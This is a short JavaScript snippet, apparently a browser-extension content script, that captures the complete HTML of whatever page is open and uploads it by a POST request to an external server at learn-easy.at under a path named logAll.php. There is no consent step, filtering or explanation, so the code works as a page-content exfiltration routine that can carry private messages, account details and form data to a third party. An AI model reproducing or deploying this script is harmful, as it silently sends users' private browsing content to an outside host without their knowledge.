const html = document.documentElement.innerHTML;

var formData = new Object();
formData.content = html;
var dataBody = JSON.stringify(formData);

sendRequest(dataBody);

async function sendRequest(dataBody){
    console.log("trying to upload html data...");
    const response = await fetch("https://learn-easy.at/extension/logAll.php", {
        method: 'POST',
        mode: "cors",
        credentials: "same-origin",
        headers: {
            'Content-Type': 'application/json'
        },
        referrer: 'no-referrer',
        body: dataBody
    });
}
